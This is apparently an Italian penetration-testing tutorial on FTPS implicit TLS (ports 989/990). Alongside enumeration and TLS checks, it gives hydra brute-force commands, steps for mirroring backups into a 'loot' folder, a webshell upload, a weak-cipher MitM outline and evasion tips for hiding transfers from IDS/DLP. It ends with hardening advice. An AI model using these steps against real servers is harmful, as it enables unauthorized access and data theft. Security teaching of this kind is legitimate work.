---
title: 'Porta 989 FTPS-Data: canale dati cifrato, TLS implicito e sicurezza del file transfer.'
slug: porta-989-ftps-data
description: 'Scopri cos’è la porta 989 ftps-data, come si collega alla 990 nel FTPS implicito e perché certificati, TLS e permessi di accesso restano centrali per valutare la sicurezza del trasferimento file.'
image: /porta-989-ftps-data.webp
draft: true
date: 2026-04-08T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - tls-inspection
  - ftps-implicit
---

# Porta 989 FTPS-Data: Testare il Canale Dati FTP Cifrato

> **Executive Summary** — La porta 989 è il canale dati di FTPS (FTP over implicit TLS), la versione cifrata del protocollo FTP. Mentre la porta 990 gestisce il canale di controllo (comandi e autenticazione), la 989 trasporta i file effettivi. La presenza di entrambe indica un server FTP con cifratura implicit TLS — più sicuro di FTP plain ma ancora vulnerabile a misconfiguration TLS, credenziali deboli e permessi di accesso errati. Questa guida copre il canale dati FTPS nel contesto del pentest, con focus su TLS inspection, credential attack e file access.

```id="u3c7nb"
TL;DR

- La porta 989 è il canale dati di FTPS implicit — trasporta i file, mentre la porta 990 gestisce i comandi
- FTPS implicit è più sicuro di FTPS explicit (STARTTLS su 21) perché il TLS si stabilisce subito, senza rischio di downgrade
- Il test principale è sulla porta 990 (controllo) — la 989 si attiva automaticamente durante il trasferimento file

```

Porta 989 FTPS-Data è il canale TCP dedicato al trasferimento dati nel protocollo FTPS con TLS implicito. La porta 989 vulnerabilità sono correlate alla configurazione TLS (cipher deboli, certificati scaduti), ai permessi sui file trasferiti e alla correlazione con la porta 990 (canale di controllo). L'enumerazione porta 989 conferma la presenza di FTPS implicit e permette di verificare la qualità della cifratura del canale dati. Nel FTPS pentest, il focus è sulla porta 990 per autenticazione e comandi, ma la 989 è rilevante per l'intercettazione del trasferimento e la verifica della cifratura end-to-end. Nella kill chain si posiziona come data exfiltration (file transfer cifrato) e come lateral movement quando il server FTPS contiene backup o configurazioni.

## 1. Anatomia Tecnica della Porta 989

La porta 989 è registrata IANA come `ftps-data`. FTP usa due canali separati — e nella variante FTPS, entrambi sono cifrati:

| Tipo           | Plain FTP | FTPS Implicit     | FTPS Explicit     |
| -------------- | --------- | ----------------- | ----------------- |
| **Controllo**  | 21/TCP    | **990/TCP** (TLS) | 21/TCP + STARTTLS |
| **Dati**       | 20/TCP    | **989/TCP** (TLS) | 20/TCP + STARTTLS |
| TLS            | No        | Dal primo byte    | Dopo STARTTLS     |
| Downgrade risk | N/A       | No                | Sì                |

Il flusso FTPS implicit:

1. Client si connette alla **porta 990** — TLS handshake immediato per il canale di controllo
2. Client si autentica (USER/PASS) — cifrato
3. Client richiede un trasferimento (LIST, RETR, STOR)
4. Server apre il canale dati sulla **porta 989** (passive mode: porta alta random)
5. Secondo TLS handshake per il canale dati
6. File trasferito su canale cifrato

```
Misconfig: TLS 1.0/1.1 o cipher deboli sul canale dati
Impatto: possibile decifratura del trasferimento file con attacco MitM
Come si verifica: openssl s_client -connect [server]:989 — verifica protocol e cipher
```

```
Misconfig: Certificato canale dati diverso dal canale controllo
Impatto: possibile MitM selettivo sul canale dati
Come si verifica: confronta i certificati su 989 e 990
```

```
Misconfig: FTPS implicit sulla 990 ma FTP plain sulla 21 ancora attivo
Impatto: un attacker può forzare la connessione sulla 21 in chiaro
Come si verifica: nmap -p 21,990 [target] — se entrambe aperte, il plain FTP è un rischio
```

## 2. Enumerazione Base

### Comando 1: Nmap — scan combinato 989 + 990

```bash
nmap -sV -sC -p 989,990,21 10.10.10.70
```

**Output atteso:**

```
PORT    STATE  SERVICE     VERSION
21/tcp  closed ftp
989/tcp open   ftps-data
990/tcp open   ftps        vsftpd 3.0.5
| ssl-cert: Subject: CN=ftp.corp.local
|   Issuer: CN=corp-CA
```

**Cosa ci dice questo output:** la porta 21 è chiusa (bene — nessun FTP plain). FTPS implicit attivo sulle porte 990 (controllo) e 989 (dati). Server vsftpd 3.0.5 con certificato da CA interna. La sicurezza del trasferimento dipende dalla configurazione TLS.

### Comando 2: TLS check sul canale dati

```bash
openssl s_client -connect 10.10.10.70:989
```

**Output atteso:**

```
CONNECTED(00000003)
---
SSL handshake has read 1500 bytes and written 400 bytes
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server certificate:
    subject=CN = ftp.corp.local
```

**Cosa ci dice questo output:** TLS 1.3 con cipher forte sul canale dati — la cifratura è solida. Verifica lo stesso sulla porta 990 per confermare coerenza.

## 3. Enumerazione Avanzata

### Connessione FTPS e listing

```bash
lftp -u user,password ftps://10.10.10.70:990
lftp> ls
```

**Output:**

```
drwxr-xr-x   2 user group     4096 Jan 15 backup/
-rw-r--r--   1 user group  5242880 Jan 15 db_export.sql.gz
-rw-------   1 user group     1234 Jan 15 .ssh_config
```

**Lettura dell'output:** directory `backup/` e file `db_export.sql.gz` sono target primari. `.ssh_config` potrebbe contenere chiavi o hostname interni. Per la [post-exploitation via file sensibili](https://hackita.it/articoli/post-exploitation), scarica tutto.

### Test TLS completo con testssl.sh

```bash
testssl.sh --starttls ftp 10.10.10.70:990
```

**Output (rilevante):**

```
Testing protocols
 TLS 1.3    yes
 TLS 1.2    yes
 TLS 1.1    no
 TLS 1.0    no

Testing cipher categories
 NULL ciphers: none
 Export ciphers: none
 RC4: none
 3DES: none
```

**Lettura dell'output:** solo TLS 1.2/1.3, nessun cipher debole — configurazione solida. Se trovi TLS 1.0 o cipher RC4/3DES, è un finding di severità media.

### Verifica anonymous login

```bash
lftp -u anonymous,anonymous ftps://10.10.10.70:990
lftp> ls
```

**Output (anonimo funzionante):**

```
drwxr-xr-x   2 ftp ftp    4096 Jan 15 pub/
-rw-r--r--   1 ftp ftp   10240 Jan 15 readme.txt
```

**Output (anonimo bloccato):**

```
Login failed.
```

## 4. Tecniche Offensive

**Credential brute force su FTPS (porta 990)**

Contesto: la porta 989 è il canale dati — l'autenticazione avviene sulla 990. Brute force sulle credenziali FTPS.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftps://10.10.10.70:990 -t 4
```

**Output (successo):**

```
[990][ftps] host: 10.10.10.70   login: admin   password: Backup2025!
```

**Cosa fai dopo:** accedi con le credenziali e scarica i file. Il canale dati (989) si attiverà automaticamente durante il download. Per il [brute force su altri protocolli](https://hackita.it/articoli/bruteforce), testa le stesse credenziali su SSH, SMB e RDP.

**Download file sensibili**

Contesto: accesso FTPS con credenziali valide. Scarica backup e configurazioni.

```bash
lftp -u admin,Backup2025! ftps://10.10.10.70:990
lftp> mirror backup/ /tmp/ftps_loot/
lftp> get db_export.sql.gz -o /tmp/
lftp> get .ssh_config -o /tmp/
```

**Output:**

```
Total: 3 files, 52MB transferred
```

**Cosa fai dopo:** analizza i file. `db_export.sql.gz` potrebbe contenere hash password o dati sensibili. `backup/` potrebbe contenere copie di `/etc/shadow` o configurazioni con credenziali. Il canale dati (989) ha trasferito i file cifrati — ma ora sono sul tuo disco.

**Upload file malevolo (se writable)**

Contesto: il server FTPS accetta upload.

```bash
lftp -u admin,Backup2025! ftps://10.10.10.70:990
lftp> put /tmp/shell.php -o /var/www/html/shell.php
```

**Output (successo):**

```
shell.php uploaded
```

**Cosa fai dopo:** se la directory corrisponde alla web root, hai una webshell accessibile via browser. Consulta le [tecniche di upload e webshell](https://hackita.it/articoli/webshell).

**MitM sul canale dati con cipher deboli**

Contesto: TLS 1.0 con cipher CBC sul canale dati. Attacco BEAST/POODLE.

```bash
# Verifica cipher deboli
openssl s_client -connect 10.10.10.70:989 -tls1 -cipher RC4-SHA
```

**Output (cipher accettato — vulnerabile):**

```
New, TLSv1/SSLv3, Cipher is RC4-SHA
```

**Cosa fai dopo:** con un MitM (ARP spoofing + SSL proxy), puoi decifrare il traffico sul canale dati e intercettare i file in transito. Documenta come finding e raccomanda upgrade a TLS 1.2+.

## 5. Scenari Pratici di Pentest

### Scenario 1: Backup server con FTPS

**Situazione:** server FTPS dedicato ai backup automatici. Porte 989/990 aperte internamente.

**Step 1:**

```bash
nmap -sV -p 21,989,990 10.10.10.70
```

**Step 2:**

```bash
hydra -l backup -P passwords.txt ftps://10.10.10.70:990 -t 2
```

**Step 3:**

```bash
lftp -u backup,found_pass ftps://10.10.10.70:990 -e "mirror / /tmp/ftps_dump/"
```

**Se fallisce:**

* Causa: rate limiting o lockout
* Fix: spray lento, o cerca credenziali in configurazioni di backup (crontab, script)

**Tempo stimato:** 10-30 minuti

### Scenario 2: FTPS con FTP plain ancora attivo

**Situazione:** il server ha sia la porta 21 che la 990 aperta.

**Step 1:**

```bash
nmap -sV -p 21,989,990 10.10.10.70
# Entrambe aperte
```

**Step 2:**

```bash
# Prova FTP plain prima — senza cifratura
ftp 10.10.10.70
> anonymous
> ls
```

**Se fallisce:**

* Causa: anonymous disabilitato anche su plain FTP
* Fix: usa lo stesso brute force sia sulla 21 che sulla 990

**Tempo stimato:** 5-15 minuti

### Scenario 3: Verifica compliance TLS

**Situazione:** audit di sicurezza. Verifica che il canale dati FTPS sia conforme.

**Step 1:**

```bash
testssl.sh --starttls ftp 10.10.10.70:990
```

**Step 2:**

```bash
openssl s_client -connect 10.10.10.70:989 2>/dev/null | grep "Protocol\|Cipher"
```

**Se fallisce:**

* Causa: la 989 risponde solo durante un trasferimento attivo
* Fix: avvia una sessione FTPS e fai listing per attivare il canale dati, poi testa

**Tempo stimato:** 5-10 minuti

## 6. Attack Chain Completa

| Fase        | Tool            | Comando                                  | Risultato            |
| ----------- | --------------- | ---------------------------------------- | -------------------- |
| Recon       | nmap            | `nmap -sV -p 21,989,990`                 | FTPS confermato      |
| TLS Check   | testssl/openssl | `testssl.sh --starttls ftp [target]:990` | Qualità cifratura    |
| Cred Attack | hydra           | `hydra ftps://[target]:990`              | Credenziali          |
| File Access | lftp            | `mirror / /tmp/dump/`                    | File sensibili       |
| Upload      | lftp            | `put shell.php -o /web/root/`            | Webshell/persistenza |

## 7. Detection & Evasion

### Blue Team

* **FTP log**: vsftpd/proftpd logga ogni login e trasferimento in `/var/log/vsftpd.log`
* **IDS**: brute force pattern su porta 990
* **DLP**: contenuto dei file trasferiti (ma su FTPS il canale dati è cifrato — DLP non vede)

### Evasion

```
Tecnica: Download selettivo
Come: scarica solo file specifici — non mirror completo
Riduzione rumore: meno trasferimenti = meno log
```

```
Tecnica: FTPS cifra il canale dati
Come: il contenuto dei file trasferiti è invisibile a IDS/DLP
Riduzione rumore: solo i metadati della connessione sono visibili, non il contenuto
```

## 8. Toolchain e Confronto

| Aspetto           | FTPS Implicit (990/989) | FTPS Explicit (21)  | SFTP (22)          | SCP (22)   |
| ----------------- | ----------------------- | ------------------- | ------------------ | ---------- |
| Porte             | 990 ctrl + 989 data     | 21 + STARTTLS       | 22                 | 22         |
| TLS               | Implicit (subito)       | Dopo STARTTLS       | SSH tunnel         | SSH tunnel |
| Downgrade risk    | No                      | Sì (STARTTLS strip) | No                 | No         |
| Firewall friendly | No (porte multiple)     | No                  | Sì (singola porta) | Sì         |
| Tool pentest      | hydra, lftp             | hydra, ftp client   | hydra, ssh         | scp        |

## 9. Troubleshooting

| Errore                                 | Causa                                         | Fix                                            |
| -------------------------------------- | --------------------------------------------- | ---------------------------------------------- |
| 989 filtered                           | Firewall o passive mode su porta alta         | Usa passive mode e verifica range porte        |
| TLS handshake failed su 989            | Canale dati non attivo (nessun trasferimento) | Avvia sessione su 990 e fai LIST prima         |
| lftp `Certificate verification failed` | Cert self-signed                              | `set ssl:verify-certificate no` in lftp        |
| hydra `connection refused` su 990      | ftps\:// non supportato dalla versione hydra  | Usa `medusa -h [target] -M ftp -n 990`         |
| Transfer timeout                       | NAT o firewall blocca canale dati             | Forza passive mode: `set ftp:passive-mode yes` |

## 10. FAQ

**D: Che differenza c'è tra porta 989 e 990?**
R: La 990 è il canale di controllo (comandi, autenticazione). La 989 è il canale dati (trasferimento file). Entrambe usano TLS implicito.

**D: La porta 989 è sempre attiva?**
R: No. Si attiva solo durante un trasferimento file (LIST, RETR, STOR). In passive mode, il server potrebbe usare una porta alta random invece della 989.

**D: FTPS è più sicuro di SFTP?**
R: SFTP (SSH File Transfer Protocol su porta 22) è generalmente preferito perché usa una singola porta, non ha il problema del canale dati separato e beneficia della sicurezza SSH. FTPS richiede gestione di certificati TLS e firewall più complesse.

## 11. Cheat Sheet Finale

| Azione         | Comando                                         |
| -------------- | ----------------------------------------------- |
| Scan           | `nmap -sV -p 21,989,990 [target]`               |
| TLS check 990  | `openssl s_client -connect [target]:990`        |
| TLS check 989  | `openssl s_client -connect [target]:989`        |
| TLS full audit | `testssl.sh --starttls ftp [target]:990`        |
| Anonymous test | `lftp -u anonymous,anon ftps://[target]:990`    |
| Brute force    | `hydra -l user -P wordlist ftps://[target]:990` |
| Connect        | `lftp -u user,pass ftps://[target]:990`         |
| List files     | `lftp> ls` / `lftp> ls -la`                     |
| Download all   | `lftp> mirror / /tmp/loot/`                     |
| Upload         | `lftp> put file -o /remote/path/`               |

### Perché Porta 989 è rilevante nel 2026

FTPS è ancora usato per backup automatici, scambio file B2B e compliance (PCI-DSS richiede cifratura). La porta 989 conferma FTPS implicit — il canale dati cifrato rende il traffico opaco a IDS/DLP. Server FTPS con credenziali deboli e directory di backup sono ancora comuni in ambienti enterprise.

### Hardening

* Disabilita FTP plain (porta 21) — forza FTPS o migra a SFTP
* TLS 1.2+ con cipher forti (no RC4, no 3DES, no CBC)
* Disabilita anonymous login
* Limita le directory accessibili con chroot
* Log e monitoring dei trasferimenti

### OPSEC

Il canale dati FTPS è cifrato — IDS/DLP non vedono il contenuto dei file. Il brute force sulla 990 è visibile nei log. Download selettivo è meno rumoroso di mirror completo. Se possibile, usa credenziali trovate altrove piuttosto che brute force. Approfondimento: [https://scanitex.com/en/resources/ports/tcp/989](https://scanitex.com/en/resources/ports/tcp/989)

***

Riferimento: RFC 4217 (FTP over TLS), RFC 959 (FTP). Uso esclusivo in ambienti autorizzati.

> Vuoi supportare HackIta? [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
